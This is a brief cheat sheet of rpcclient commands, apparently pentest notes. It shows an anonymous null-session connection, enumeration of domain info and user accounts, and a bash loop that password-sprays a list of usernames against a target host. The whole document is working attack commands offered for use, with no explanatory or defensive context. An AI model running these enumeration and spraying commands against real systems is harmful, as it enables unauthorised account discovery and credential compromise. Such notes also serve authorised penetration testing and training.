###### Connecting
```
rpcclient -U'%' <IP>
```
###### RPCClient
```
querydominfo
enumdomusers
queryuser <RID>
```
###### Password Spraying
```
for u in $(cat <USER_LIST>);do rpcclient -U "$u%<PASS>" -c "getusername;quit" <IP> | grep Authority; done
```